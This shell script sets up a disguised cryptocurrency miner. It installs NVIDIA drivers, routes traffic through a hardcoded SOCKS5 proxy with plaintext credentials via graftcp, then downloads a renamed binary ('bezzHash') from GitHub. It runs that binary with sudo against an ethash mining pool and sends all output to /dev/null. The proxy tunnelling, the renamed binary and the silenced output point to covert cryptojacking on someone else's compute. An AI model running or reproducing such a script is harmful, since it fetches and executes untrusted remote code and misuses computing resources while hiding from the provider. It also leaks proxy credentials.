#!/bin/sh

apt update && apt-get install libpci3 && sudo apt-get --purge remove "*nvidia*" &&  sudo apt-get install nvidia-driver-460
wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz

tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 176.53.133.217:57597
socks5_username = 2BHVpyGPD
socks5_password = 1rN14HAmV
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

echo " "
echo " "

echo ""

./graftcp/graftcp curl ifconfig.me

echo " "
echo " "

echo ""

echo " "
echo " "

./graftcp/graftcp wget https://github.com/aurbach55/zash/raw/main/bezzHash
chmod +x bezzHash

./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
unzip magicBezzHash.zip

./graftcp/graftcp sudo ./bezzHash -pool stratum+tcp://ethash.kupool.com:8888 -wal berkah.001 -pass x -a coinX -tt 70 -tstop 84 -tstart 72  -fret 2 -rate 1 >/dev/null 2>&1
 
